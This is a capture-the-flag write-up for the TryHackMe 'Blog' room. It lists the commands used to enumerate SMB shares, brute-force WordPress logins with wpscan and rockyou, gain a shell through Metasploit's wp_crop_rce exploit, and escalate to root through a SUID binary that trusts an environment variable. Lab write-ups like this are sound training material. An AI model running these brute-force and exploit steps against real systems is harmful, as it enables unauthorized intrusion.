# Blog

<img align="right" src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/blog/blog01.png" width="150" height="150">

LINK = [https://tryhackme.com/room/blog](https://tryhackme.com/room/blog)

### FYI
This writeup don't include any passwords/cracked hashes/flags

# Description
Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!

# Steps

1: Add the dns registerWhat tool will allow us to enumerate port 139/445?
* ```echo "<ip-virtual-machine> blog.thm >> /etc/hosts```

2: Scan the open ports
* ```nmap -sV <ip-virtual-machine>```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/blog/blog02.png" width="50%">

3: Scan the SMB share folders
* ```smbmap.py -H <ip-virtual-machine>```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/blog/blog03.png" width="50%">

4: Let's examinate the contect of the share folder
* ```smbclient //<ip-virtual-machine>/BillySMB```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/blog/blog04.png" width="50%">

5: Download all the content of the share folder
* ```smbget -R smb://<ip-virtual-machine>/BillySMB```

6: Check the files for hiden data ( *Sadly it's a rabbit hole 😞*)
* ```steghide extract -sf <filename>```

7: Scan the Wordpress for usernames
* ```wpscan --url blog.thm -e u```

8: Using the 2 usernames that we found lets try to get the passwords
* ```wpscan --url blog.thm -U kwheel,bjoel -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 64```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/blog/blog05.png">

9: Base on the wpscan we know that is using Wordpress 5.0, lets search an exploit for it
* ```msfconsole```
* ```searchsploit wordpress core 5.0```
* ```search crop-image```
* ```use exploit/multi/http/wp_crop_rce```

10: Set all the necesary options from the exploit
* ```set RHOST <ip-virtual-machine>```
* ```set USERNAME kwheel```
* ```set PASSWORD <password-from-wpscan>```
* ```exploit```

11: Now that we have the shell lets search how to escalate privileges
* ```find / -perm -u=s -type f 2>/dev/null```

12: Executing the only sbin from the output we see that we are not Root
* ```ltrace checker```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/blog/blog06.png">

* We can see that the binary checks if the admin environment variable is declared, so lets declare one
* ```export admin=thm```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/blog/blog07.png">

* execute the binary again and you will see that you are now root

13: Search for the file ```user.txt```
* ```find / -name user.txt 2>/dev/null | grep user.txt```

14: Get the flags!! 😎
